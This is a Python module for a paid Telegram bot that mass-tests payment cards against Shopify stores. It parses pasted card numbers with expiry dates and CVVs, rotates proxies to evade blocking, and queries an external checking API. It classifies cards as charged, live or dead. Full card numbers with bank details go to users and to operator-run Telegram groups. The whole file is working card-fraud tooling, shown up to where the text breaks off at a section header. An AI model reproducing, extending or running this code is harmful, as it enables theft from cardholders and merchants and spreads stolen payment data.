import asyncio
import concurrent.futures
import random
import re
import logging
import time
import threading
import string
import os
from datetime import datetime
from typing import Optional, Tuple, List
from io import BytesIO

from aiogram import types, F, Router, Bot
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.exceptions import TelegramBadRequest, TelegramForbiddenError
from aiogram.filters.callback_data import CallbackData

import database
from bin import get_bin_info
from payments import PLANS

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CONFIGURATION
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

API_BASE_URL = "https://goshopii.up.railway.app/shopii"

APPROVED_EMOJI_ID        = "4958610528588008305"
DECLINED_EMOJI_ID        = "4956612582816351459"
ERROR_EMOJI_ID           = "5447644880824181073"
CARD_EMOJI_ID            = "5447453226498552490"
USER_EMOJI_ID            = "5956561749070057536"
PRO_EMOJI_ID             = "6298678524379137990"
GATE_EMOJI_ID            = "5801044672658805468"
BUTTON_EMOJI_ID          = "5465465194056525619"
STATUS_CHECKING_EMOJI_ID = "6102447314075389214"
STATUS_STOPPED_EMOJI_ID  = "6179444193518162239"
STATUS_FINISHED_EMOJI_ID = "4958610528588008305"
BUY_EMOJI_ID             = "5935795874251674052"

CHARGED_EMOJI_IDS = [
    "5801154993188770160",
    "4956739572114392015",
    "5803233241963959320",
    "5462902520215002477",
    "5787435351521889877",
    "5323674506705785412",
    "5801005158959683238",
    "5436143465211640305",
    "5800688138833629633",
    "5891044423856296980",
    "5436068999068662274",
    "5427168083074628963",
]

BTN_CHARGED_EMOJI_ID = "5465465194056525619"
BTN_DEAD_EMOJI_ID    = "5042112436648281096"
BTN_LIVE_EMOJI_ID    = "5039793437776282663"
BTN_STOP_EMOJI_ID    = "6179444193518162239"
BTN_ALL_EMOJI_ID     = "4956324463525233747"

DEFAULT_PLAN_EMOJI_ID = "5267500801240092311"

HIT_LOG_GROUP_ID       = -1003838614236
EXTRA_CHARGED_GROUP_ID = -1003991915326

BUTTON_LOCK_SECONDS = 30

MSH_SESSIONS  = {}
SESSION_LOCKS = {}

router = Router()

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# HIT DETECTION
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

MSH_CHARGED_KEYWORDS = [
    "ORDER_PAID",
    "ORDER_COMPLETED",
]

MSH_APPROVED_KEYWORDS = [
    "INSUFFICIENT_FUNDS",
    "INCORRECT_CVV",
    "INCORRECT_CVC",
    "INVALID_CVV",
]

def check_if_charged(response: str) -> bool:
    if not response:
        return False
    ru = response.upper()
    return any(kw in ru for kw in MSH_CHARGED_KEYWORDS)

def check_if_approved(response: str) -> bool:
    if not response:
        return False
    ru = response.upper()
    return any(kw in ru for kw in MSH_APPROVED_KEYWORDS)
    
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# KEYBOARD FOR NO PLAN USERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def buy_now_keyboard():
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [
                {
                    "text": "Buy Now",
                    "callback_data": "buy_now",
                    "style": "primary",
                    "icon_custom_emoji_id": BUY_EMOJI_ID
                }
            ]
        ]
    )
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# PER-USER THREAD POOL  (keeps main loop free)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

_USER_THREAD_POOL = concurrent.futures.ThreadPoolExecutor(
    max_workers=30,
    thread_name_prefix="msh_user",
)

_MAIN_LOOP: Optional[asyncio.AbstractEventLoop] = None
_MAIN_LOOP_LOCK = threading.Lock()


def _set_main_loop(loop: asyncio.AbstractEventLoop) -> None:
    global _MAIN_LOOP
    with _MAIN_LOOP_LOCK:
        if _MAIN_LOOP is None:
            _MAIN_LOOP = loop


def _tg_run(coro, timeout: float = 60):
    """Submit an aiogram coroutine to the main bot loop from any worker thread."""
    loop = _MAIN_LOOP
    if loop is None or loop.is_closed():
        logging.warning("[TG] Main loop not ready — dropping Telegram call")
        return None
    try:
        future = asyncio.run_coroutine_threadsafe(coro, loop)
        return future.result(timeout=timeout)
    except concurrent.futures.TimeoutError:
        logging.warning("[TG] Telegram call timed out")
        return None
    except Exception as e:
        logging.error(f"[TG] Call failed: {e}")
        return None

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# SMALL CAPS HELPERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

SMALL_CAPS_MAP = {
    'a': 'ᴀ', 'b': 'ʙ', 'c': 'ᴄ', 'd': 'ᴅ', 'e': 'ᴇ',
    'f': 'ꜰ', 'g': 'ɢ', 'h': 'ʜ', 'i': 'ɪ', 'j': 'ᴊ',
    'k': 'ᴋ', 'l': 'ʟ', 'm': 'ᴍ', 'n': 'ɴ', 'o': 'ᴏ',
    'p': 'ᴘ', 'q': 'ǫ', 'r': 'ʀ', 's': 'ꜱ', 't': 'ᴛ',
    'u': 'ᴜ', 'v': 'ᴠ', 'w': 'ᴡ', 'x': 'x', 'y': 'ʏ',
    'z': 'ᴢ',
}

def to_small_caps(text: str) -> str:
    result = ""
    for ch in text:
        result += ch if (ch.isupper() or ch.lower() not in SMALL_CAPS_MAP) else SMALL_CAPS_MAP[ch]
    return result

def to_small_caps_title(text: str) -> str:
    result      = ""
    is_new_word = True
    for ch in text:
        if ch == '_':
            result += '_'; is_new_word = True
        elif ch.lower() in SMALL_CAPS_MAP:
            result += ch.upper() if is_new_word else SMALL_CAPS_MAP[ch.lower()]
            is_new_word = False
        else:
            result += ch; is_new_word = False
    return result

def get_random_charged_emoji() -> str:
    return random.choice(CHARGED_EMOJI_IDS)

def build_user_link(user_obj) -> str:
    name = user_obj.first_name or "User"
    if user_obj.username:
        return f'<a href="https://t.me/{user_obj.username}">{name}</a>'
    return f'<a href="tg://user?id={user_obj.id}">{name}</a>'

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# RATE LIMITERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

class TelegramRateLimiter:
    def __init__(self, min_interval: float = 1.0, max_burst: int = 3):
        self.min_interval    = min_interval
        self.max_burst       = max_burst
        self._last_send_time = 0.0
        self._burst_count    = 0
        self._burst_reset    = 0.0
        self._lock           = asyncio.Lock()

    async def wait_if_needed(self):
        async with self._lock:
            now = time.time()
            if now - self._burst_reset > 5.0:
                self._burst_count = 0
                self._burst_reset = now
            delay = 2.0 if self._burst_count >= self.max_burst else max(
                0.0, self.min_interval - (now - self._last_send_time)
            )
            if delay > 0:
                await asyncio.sleep(delay)
            self._last_send_time = time.time()
            self._burst_count += 1

HIT_LOG_RATE_LIMITER     = TelegramRateLimiter(min_interval=1.0, max_burst=3)
USER_DM_RATE_LIMITER     = TelegramRateLimiter(min_interval=1.0, max_burst=3)
EXTRA_GROUP_RATE_LIMITER = TelegramRateLimiter(min_interval=1.0, max_burst=3)
PROGRESS_UPDATE_LIMITER  = TelegramRateLimiter(min_interval=0.5, max_burst=10)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CALLBACK DATA
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

class MshResultCallback(CallbackData, prefix="mshr"):
    session_id: str
    result_type: str

class MshStopCallback(CallbackData, prefix="mshs"):
    session_id: str

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# PROXY MANAGER
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

class ProxyManager:
    SUCCESS_RESPONSES = [
        'CARD_DECLINED', 'ORDER_PAID', 'ORDER_COMPLETED', 'CHARGED', 'APPROVED',
        'INSUFFICIENT_FUNDS', 'INVALID_CVV', 'INCORRECT_CVV', 'INCORRECT_CVC',
        '3DS_REQUIRED', 'FRAUD_SUSPECTED', 'GENERIC_ERROR', 'DO_NOT_HONOR',
        'EXPIRED_CARD', 'INCORRECT_ZIP', 'STOLEN_CARD', 'LOST_CARD',
        'INCORRECT_NUMBER', 'AMOUNT_TOO_SMALL', 'TRANSACTION_NOT_ALLOWED',
        'RESTRICTED_CARD',
    ]
    PROXY_ERROR_PATTERNS = [
        'connection refused', 'connection reset', 'connect timeout',
        'could not resolve host', 'dns error', 'name resolution',
        'proxy authentication', 'auth failed', '407', 'tunnel failed',
        'socks error', 'network unreachable', 'host unreachable',
        'connection aborted', 'broken pipe', 'socket error',
        'too many redirects', 'redirect loop', 'ECONNREFUSED',
        'ECONNRESET', 'ETIMEDOUT', 'ENOTFOUND', 'proxy error', 'bad gateway',
    ]

    def __init__(self, proxies_list: List[str], session_id: str):
        self.session_id  = session_id
        raw              = list(dict.fromkeys(proxies_list))
        self.all_proxies = [p for p in (self._norm(x) for x in raw) if p]
        random.shuffle(self.all_proxies)
        self._lock       = threading.Lock()
        self._index      = 0
        self.total_uses  = 0
        logging.info(f"[ProxyManager] {len(self.all_proxies)} proxies for session {session_id}")

    def _norm(self, proxy: str) -> Optional[str]:
        if not proxy or not proxy.strip():
            return None
        proxy = proxy.strip()
        if proxy.startswith(('http://', 'https://', 'socks5://', 'socks4://')):
            return proxy
        if '@' in proxy and ':' in proxy.split('@')[0]:
            return f'http://{proxy}'
        parts = proxy.split()
        if len(parts) == 4:
            u, pw, h, p = parts
            return f'http://{u}:{pw}@{h}:{p}'
        parts = proxy.split(':')
        if len(parts) == 2 and parts[1].isdigit():
            return f'http://{proxy}'
        return f'http://{proxy}'

    def get_next_proxy(self) -> Tuple[Optional[str], bool]:
        if not self.all_proxies:
            return None, False
        with self._lock:
            proxy = self.all_proxies[self._index % len(self.all_proxies)]
            self._index += 1
            self.total_uses += 1
        return proxy, True

    def is_real_proxy_error(self, api_response: str, http_status: Optional[int] = None) -> bool:
        r = (api_response or '').lower()
        for s in self.SUCCESS_RESPONSES:
            if s.lower() in r:
                return False
        if '429' in r or 'too many requests' in r:
            return False
        if any(x in r for x in ['no available products', 'not shopify', 'site requires login']):
            return False
        if 'step ' in r and ('failed' in r or 'error' in r):
            return False
        if any(x in r for x in ['receipt', 'could not extract', 'missing']):
            return False
        if http_status and http_status in [200, 201, 400, 401, 402, 403, 422, 500]:
            return False
        if r.strip() in ('timeout', 'timed out', 'api timeout'):
            return False
        for pat in self.PROXY_ERROR_PATTERNS:
            if pat in r:
                return True
        return False

    def report_result(self, proxy: str, api_response: str, http_status: Optional[int] = None):
        tag = "issue" if self.is_real_proxy_error(api_response, http_status) else "OK"
        logging.debug(f"[Proxy {tag}] {mask_proxy(proxy)} | {api_response[:60]}")

    def get_available_count(self) -> int:
        return len(self.all_proxies)


def mask_proxy(proxy: str) -> str:
    try:
        if '@' in proxy:
            return f"***@{proxy.split('@')[1]}"
        return (proxy[:15] + "***") if len(proxy) > 15 else "***"
    except Exception:
        return "***"

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CARD PARSING
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def extract_cards_from_text(text: str) -> List[str]:
    patterns = [
        r'(\d{13,19})\s*\|\s*(\d{1,2})\s*\|\s*(\d{2,4})\s*\|\s*(\d{3,4})',
        r'(\d{13,19})\s*\/\s*(\d{1,2})\s*\/\s*(\d{2,4})\s*\/\s*(\d{3,4})',
        r'(\d{13,19})\s*:\s*(\d{1,2})\s*:\s*(\d{2,4})\s*:\s*(\d{3,4})',
        r'(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})',
        r'(\d{13,19})\s*=\s*(\d{1,2})\s*=\s*(\d{2,4})\s*=\s*(\d{3,4})',
    ]
    cards = []
    seen  = set()
    for pattern in patterns:
        for match in re.findall(pattern, text):
            num, month, year, cvv = match
            month = month.zfill(2)
            if len(year) == 4:
                year = year[2:]
            card_str = f"{num}|{month}|{year}|{cvv}"
            if card_str not in seen:
                seen.add(card_str)
                cards.append(card_str)
    return cards

def luhn_check(card_number: str) -> bool:
    card_number = str(card_number).strip()
    if not card_number.isdigit():
        return False
    total = 0
    for i, ch in enumerate(card_number[::-1]):
        d = int(ch)
        if i % 2 == 1:
            d *= 2
            if d > 9:
                d -= 9
        total += d
    return total % 10 == 0

def is_expired(mm: str, yy: str) -> bool:
    try:
        now = datetime.now()
        ey, em = int(yy), int(mm)
        if ey < now.year % 100:
            return True
        if ey == now.year % 100 and em < now.month:
            return True
        return False
    except ValueError:
        return True

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# MISC HELPERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

RETRY_ERRORS = [
    'r4 token empty', 'payment method is not shopify!', 'r2 id empty',
    'product not found', 'hcaptcha detected', 'tax ammount empty',
    'del ammount empty', 'product id is empty', 'py id empty',
    'clinte token', 'hcaptcha_detected', 'receipt_empty', 'na',
    'site error! status: 429', 'site requires login!', 'failed to get token',
    'no valid products', 'not shopify!', 'site not supported for now!',
    'connection error', 'connection error!', 'error processing card',
    '504', 'server error', 'client error', 'failed', 'token not found',
    'invalid_response', 'resolve', 'item', 'curl error',
    'could not resolve host', 'connect tunnel failed', 'timeout', 'proxy error',
    'step 0 failed', 'step 1 failed', 'step 2 failed', 'step 3 failed',
    'step 4 failed', 'step 5 failed', 'step 6 failed', 'step 7 failed',
    'step 8 failed', 'step 9 failed', 'step 10 failed',
    'no available products found', 'could not extract receiptid',
    'could not extract signedhandles', 'receiptid missing',
    'response missing receiptid', 'products.json',
    'returned status 429', 'returned status 500', 'returned status 502',
    'returned status 503', 'returned status 504', 'store incompatible',
    'extract signedHandles', 'missing receiptId',
]

DECLINED_RESPONSES = [
    'CARD_DECLINED', 'PROCESSING_ERROR', 'GENERIC_DECLINE', 'DO NOT HONOR',
    'DO_NOT_HONOR', 'UNKNOWN_ERROR', 'PICK_UP_CARD', 'DECISION_RULE_BLOCK',
    'FRAUD_SUSPECTED', '3DS_REQUIRED', 'INVALID_PURCHASE_TYPE',
    'INVALID_PAYMENT_METHOD', 'TEST_MODE_LIVE_CARD', 'AMOUNT_TOO_SMALL',
    'INCORRECT_NUMBER', 'EXPIRED_CARD', 'RESTRICTED_CARD', 'LOST_CARD',
    'STOLEN_CARD', 'TRANSACTION_NOT_ALLOWED',
]

def is_session_stopped(session_id: str) -> bool:
    session = MSH_SESSIONS.get(session_id)
    if not session:
        return True
    return session.get('status') == "STOPPED"

def is_buttons_locked(session_id: str) -> bool:
    session = MSH_SESSIONS.get(session_id)
    if not session:
        return False
    return (time.time() - session.get('start_time', 0)) < BUTTON_LOCK_SECONDS

def get_remaining_lock(session_id: str) -> int:
    session = MSH_SESSIONS.get(session_id)
    if not session:
        return 0
    remaining = BUTTON_LOCK_SECONDS - (time.time() - session.get('start_time', 0))
    return max(0, int(remaining) + 1)

def log_hit_to_mshh(user_id, username, first_name):
    try:
        with open("mshh.txt", "a", encoding="utf-8") as f:
            f.write(f"{user_id}|{username or 'None'}|{first_name or 'Unknown'}\n")
    except Exception as e:
        logging.error(f"Error writing to mshh.txt: {e}")

def load_msh_proxies() -> List[str]:
    proxies = []
    candidates = [
        os.path.join(os.path.dirname(os.path.abspath(__file__)), "px.txt"),
        "mass_gates/px.txt",
        "./mass_gates/px.txt",
        "px.txt",
    ]
    for path in candidates:
        if os.path.exists(path):
            try:
                with open(path, "r", encoding="utf-8", errors="ignore") as f:
                    proxies = [l.strip() for l in f if l.strip() and not l.startswith(("#", ";", "//"))]
                break
            except Exception as e:
                logging.error(f"[MSH] Error reading {path}: {e}")
    if not proxies:
        logging.warning("[MSH] px.txt not found — no proxies loaded")
    seen, uniq = set(), []
    for p in proxies:
        if p not in seen:
            seen.add(p); uniq.append(p)
    logging.info(f"[MSH] Loaded {len(uniq)} proxies")
    return uniq

def get_sites() -> List[str]:
    try:
        db_sites = database.get_all_sites()
        if db_sites:
            logging.debug(f"[MSH] Loaded {len(db_sites)} sites from DB")
            return db_sites
    except Exception as e:
        logging.error(f"[MSH] Error reading sites from DB: {e}")
    try:
        candidates = [
            os.path.join(os.path.dirname(os.path.abspath(__file__)), "sites.txt"),
            "sites.txt",
        ]
        for path in candidates:
            if os.path.exists(path):
                with open(path, "r", encoding="utf-8", errors="ignore") as f:
                    sites = [l.strip() for l in f if l.strip()]
                if sites:
                    logging.warning(f"[MSH] DB empty — loaded {len(sites)} sites from {path}")
                    return sites
    except Exception as e:
        logging.error(f"[MSH] Error reading sites.txt: {e}")
    logging.error("[MSH] No sites found — using placeholder")
    return ["https://example.com"]

async def get_user_plan_name(user_id: int) -> str:
    try:
        is_active = await asyncio.to_thread(database.is_premium_active, user_id)
        if not is_active:
            return "TRIAL"
        def _sync():
            conn = database.get_connection()
            cur  = conn.cursor()
            cur.execute("SELECT current_plan FROM users WHERE user_id = %s", (user_id,))
            row = cur.fetchone()
            conn.close()
            return row['current_plan'].upper() if row and row.get('current_plan') else "PREMIUM"
        return await asyncio.to_thread(_sync)
    except Exception:
        return "PREMIUM"

async def get_user_plan_emoji_id(user_id: int) -> str:
    """Returns the plan status emoji ID for the user, like b3.py does."""
    try:
        is_active = await asyncio.to_thread(database.is_premium_active, user_id)
        if not is_active:
            return DEFAULT_PLAN_EMOJI_ID
        def _sync():
            conn = database.get_connection()
            cur  = conn.cursor()
            cur.execute("SELECT current_plan FROM users WHERE user_id = %s", (user_id,))
            row = cur.fetchone()
            conn.close()
            return row.get('current_plan') if row else None
        plan_key = await asyncio.to_thread(_sync)
        if plan_key and plan_key in PLANS:
            return PLANS[plan_key].get("emoji_id", DEFAULT_PLAN_EMOJI_ID)
        return DEFAULT_PLAN_EMOJI_ID
    except Exception as e:
        logging.error(f"[MSH] Error fetching plan emoji for {user_id}: {e}")
        return DEFAULT_PLAN_EMOJI_ID

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# API CALL
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def process_card_api(cc: str, mes: str, ano: str, cvv: str, site: str, proxy: str):
    import aiohttp
    import json as _json
    cc_fmt  = f"{cc}|{mes}|{ano[-2:]}|{cvv}"
    api_url = f"{API_BASE_URL}?site={site}&cc={cc_fmt}&proxy={proxy}"
    http_status = None
    try:
        timeout = aiohttp.ClientTimeout(total=180)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(api_url) as resp:
                http_status = resp.status
                if resp.status == 200:
                    try:
                        data = await resp.json(content_type=None)
                    except Exception:
                        raw = await resp.text()
                        data = _json.loads(raw)
                    gateway      = data.get("Gateway", "Shopify")
                    price        = str(data.get("Price", "0.00"))
                    proxy_raw    = data.get("Proxy", "Dead")
                    api_response = data.get("Response", "Unknown Error")
                    proxy_status = "Live" if "live" in str(proxy_raw).lower() else "Dead"
                    return True, api_response, site, gateway, price, "USD", proxy_status, http_status
                return False, f"API Error: HTTP {resp.status}", site, "Shopify", "0.00", "USD", "Error", http_status
    except asyncio.CancelledError:
        raise
    except (asyncio.TimeoutError, Exception) as e:
        msg = "timeout" if "timeout" in type(e).__name__.lower() else f"connection error: {e}"
        return False, msg, site, "Shopify", "0.00", "USD", "Dead", None

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# RESULT FILE GENERATION
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def generate_result_file(session: dict, result_type: str, user_obj, plan_name: str) -> Tuple[BytesIO, str, int]:
    if result_type == "charged":
        cards_list  = session.get('charged_cards', [])
        type_label  = "Cʜᴀʀɢᴇᴅ"
        type_emoji  = "💎"
    elif result_type == "live":
        cards_list  = session.get('live_cards', [])
        type_label  = "Lɪᴠᴇ"
        type_emoji  = "✅"
    elif result_type == "dead":
        cards_list  = session.get('dead_cards', [])
        type_label  = "Dᴇᴀᴅ"
        type_emoji  = "❌"
    else:
        cards_list  = (session.get('charged_cards', []) + session.get('live_cards', [])
                       + session.get('dead_cards', []) + session.get('error_cards', []))
        type_label  = "Aʟʟ"
        type_emoji  = "📁"

    total_count  = len(cards_list)
    user_display = f"{user_obj.first_name} ({plan_name})"

    lines = [
        f"[₪] Gᴀᴛᴇ ➛ Sʜᴏᴘɪꜰʏ | Mass",
        "━━━━━━━━━━━━━━",
        f"      Rᴇsᴜʟᴛ ➛ {type_label} {type_emoji}",
        f"      Tᴏᴛᴀʟ ➛ {total_count}",
        "━━━━━━━━━━━━━━",
    ]

    if total_count == 0:
        lines.append("No cards found for this category.")
    else:
        for card_data in cards_list:
            cc       = card_data.get('card', 'N/A')
            response = card_data.get('response', 'N/A')
            bin_info = card_data.get('bin_info', {})
            price    = card_data.get('price', '0.00')
            scheme   = bin_info.get('scheme', 'N/A') if bin_info else 'N/A'
            bank     = bin_info.get('bank', 'N/A') if bin_info else 'N/A'
            country  = bin_info.get('country', 'N/A') if bin_info else 'N/A'
            flag     = bin_info.get('country_emoji', '') if bin_info else ''
            country_display = f"{flag} {country}".strip()

            if check_if_charged(response):
                raw_display = "Oʀᴅᴇʀ_Pᴀɪᴅ"
                status      = "Cʜᴀʀɢᴇᴅ 💎"
            elif check_if_approved(response):
                raw_display = response
                status      = "Lɪᴠᴇ ✅"
            else:
                raw_display = response
                status      = "Dᴇᴄʟɪɴᴇᴅ ❌"

            lines += [
                f"Cᴀʀᴅ ➛ {cc}",
                f"Sᴛᴀᴛᴜs ➛ {status}",
                f"Gᴀᴛᴇ ➛ Sʜᴏᴘɪꜰʏ | {price} $",
                f"Rᴀᴡ ➛ {raw_display}",
                f"Bʀᴀɴᴅ ➛ {scheme}",
                f"Issᴜᴇʀ ➛ {bank}",
                f"Cᴏᴜɴᴛʀʏ ➛ {country_display}",
                f"Uꜱᴇʀ ➛ {user_display}",
                "━━━━━━━━━━━━━━",
            ]

    content     = "\n".join(lines)
    file_buffer = BytesIO(content.encode('utf-8'))
    file_buffer.seek(0)
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    type_map  = {"charged": "CHARGED", "live": "LIVE", "dead": "DEAD", "all": "ALL"}
    filename  = f"MSH_{type_map.get(result_type, 'ALL')}_{timestamp}.txt"
    return file_buffer, filename, total_count

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# TELEGRAM MESSAGE SENDERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def _bot_button() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[[
        {"text": "𝘾𝘼𝙍𝘿 ✘ 𝘾𝙃𝙆", "url": "https://t.me/CARDXV4_BOT",
         "style": "primary", "icon_custom_emoji_id": BUTTON_EMOJI_ID}
    ]])

async def send_hit_log_to_group(bot: Bot, price: str, user_obj, plan_emoji_id: str):
    await HIT_LOG_RATE_LIMITER.wait_if_needed()
    user_link        = build_user_link(user_obj)
    charged_emoji_id = get_random_charged_emoji()
    text = (
        f'<a href="https://t.me/FailureFr_07">[ 𖥷iТ ]</a> ➛ <b>Cʜᴀʀɢᴇᴅ <tg-emoji emoji-id="{charged_emoji_id}">💎</tg-emoji></b>\n'
        f'<b>Gᴀᴛᴇ ➛ Sʜᴏᴘɪꜰʏ | {price} $</b>\n'
        f'<b>Rᴀᴡ ➛ Oʀᴅᴇʀ_Pᴀɪᴅ <tg-emoji emoji-id="4958926882994127612">✅</tg-emoji></b>\n'
        f'<b>Uꜱᴇʀ ➛ {user_link} <tg-emoji emoji-id="{plan_emoji_id}">⭐</tg-emoji></b>'
    )
    try:
        await bot.send_message(chat_id=HIT_LOG_GROUP_ID, text=text, parse_mode="HTML",
                               reply_markup=_bot_button(), disable_web_page_preview=True)
    except Exception as e:
        logging.error(f"[MSH] HIT log error: {e}")

async def send_approved_msg_to_user(bot: Bot, cc_formatted: str, response_msg: str,
                                    bin_data: dict, price: str, user_obj, plan_emoji_id: str):
    await USER_DM_RATE_LIMITER.wait_if_needed()
    user_link    = build_user_link(user_obj)
    dev_link     = '<a href="https://t.me/FailureFr_07">kคli liຖนxx</a>'
    raw_styled   = to_small_caps_title(str(response_msg))
    scheme       = bin_data.get('scheme', 'N/A') if bin_data else 'N/A'
    bank         = bin_data.get('bank', 'N/A') if bin_data else 'N/A'
    country      = bin_data.get('country', 'N/A') if bin_data else 'N/A'
    flag         = bin_data.get('country_emoji', '') if bin_data else ''
    bin_info_str = f"{scheme} - {bank} - {flag} {country}".strip(" -")
    text = (
        f'<a href="https://t.me/FailureFr_07">[ 𖥷iТ ]</a> ➛ <b>Lɪᴠᴇ <tg-emoji emoji-id="{APPROVED_EMOJI_ID}">✅</tg-emoji></b>\n'
        f'<tg-emoji emoji-id="{CARD_EMOJI_ID}">🔍</tg-emoji> ➛ <code>{cc_formatted}</code>\n'
        f'<b>Gᴀᴛᴇ ➛ Sʜᴏᴘɪꜰʏ | {price} $</b>\n'
        f'<b>Rᴀᴡ ➛ {raw_styled}</b>\n'
        f'<b>Iɴꜰᴏ ➛</b> <code>{bin_info_str}</code>\n'
        f'<b>Uꜱᴇʀ ➛ {user_link} <tg-emoji emoji-id="{plan_emoji_id}">⭐</tg-emoji></b>\n'
        f'<b>Pʀᴏ ➛ {dev_link} <tg-emoji emoji-id="{PRO_EMOJI_ID}">⚡</tg-emoji></b>'
    )
    try:
        await bot.send_message(chat_id=user_obj.id, text=text, parse_mode="HTML",
                               reply_markup=_bot_button(), disable_web_page_preview=True)
    except (TelegramForbiddenError, TelegramBadRequest) as e:
        logging.warning(f"[MSH] Could not DM live hit to {user_obj.id}: {e}")
    except Exception as e:
        logging.error(f"[MSH] Live DM error: {e}")

async def send_charged_msg_to_user(bot: Bot, cc_formatted: str, bin_data: dict,
                                   price: str, user_obj, plan_emoji_id: str):
    charged_emoji_id = get_random_charged_emoji()
    user_link        = build_user_link(user_obj)
    dev_link         = '<a href="https://t.me/FailureFr_07">kคli liຖนxx</a>'
    scheme           = bin_data.get('scheme', 'N/A') if bin_data else 'N/A'
    bank             = bin_data.get('bank', 'N/A') if bin_data else 'N/A'
    country          = bin_data.get('country', 'N/A') if bin_data else 'N/A'
    flag             = bin_data.get('country_emoji', '') if bin_data else ''
    bin_info_str     = f"{scheme} - {bank} - {flag} {country}".strip(" -")

    text_user = (
        f'<a href="https://t.me/FailureFr_07">[ 𖥷iТ ]</a> ➛ <b>Cʜᴀʀɢᴇᴅ <tg-emoji emoji-id="{charged_emoji_id}">💎</tg-emoji></b>\n'
        f'<tg-emoji emoji-id="{CARD_EMOJI_ID}">🔍</tg-emoji> ➛ <code>{cc_formatted}</code>\n'
        f'<b>Gᴀᴛᴇ ➛ Sʜᴏᴘɪꜰʏ | {price} $</b>\n'
        f'<b>Rᴀᴡ ➛ Oʀᴅᴇʀ_Pᴀɪᴅ</b>\n'
        f'<b>Iɴꜰᴏ ➛</b> <code>{bin_info_str}</code>\n'
        f'<b>Uꜱᴇʀ ➛ {user_link} <tg-emoji emoji-id="{plan_emoji_id}">⭐</tg-emoji></b>\n'
        f'<b>Pʀᴏ ➛ {dev_link} <tg-emoji emoji-id="{PRO_EMOJI_ID}">⚡</tg-emoji></b>'
    )
    text_group = (
        f'<a href="https://t.me/FailureFr_07">[ 𖥷iТ ]</a> ➛ <b>Cʜᴀʀɢᴇᴅ <tg-emoji emoji-id="{charged_emoji_id}">💎</tg-emoji></b>\n'
        f'<tg-emoji emoji-id="{CARD_EMOJI_ID}">🔍</tg-emoji> ➛ <code>{cc_formatted}</code>\n'
        f'<b>Gᴀᴛᴇ ➛ Sʜᴏᴘɪꜰʏ | {price} $</b>\n'
        f'<b>Rᴀᴡ ➛ Oʀᴅᴇʀ_Pᴀɪᴅ</b>\n'
        f'<b>Iɴꜰᴏ ➛</b> <code>{bin_info_str}</code>\n'
        f'<b>Uꜱᴇʀ ➛ {user_link} <tg-emoji emoji-id="{plan_emoji_id}">⭐</tg-emoji></b>'
    )

    await USER_DM_RATE_LIMITER.wait_if_needed()
    try:
        await bot.send_message(chat_id=user_obj.id, text=text_user, parse_mode="HTML",
                               reply_markup=_bot_button(), disable_web_page_preview=True)
    except (TelegramForbiddenError, TelegramBadRequest) as e:
        logging.warning(f"[MSH] Could not DM charged hit to {user_obj.id}: {e}")
    except Exception as e:
        logging.error(f"[MSH] Charged DM error: {e}")

    await asyncio.sleep(0.5)
    await EXTRA_GROUP_RATE_LIMITER.wait_if_needed()
    try:
        await bot.send_message(chat_id=EXTRA_CHARGED_GROUP_ID, text=text_group, parse_mode="HTML",
                               reply_markup=_bot_button(), disable_web_page_preview=True)
    except Exception as e:
        logging.error(f"[MSH] Extra group error: {e}")

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# PROGRESS MESSAGE & BUTTONS
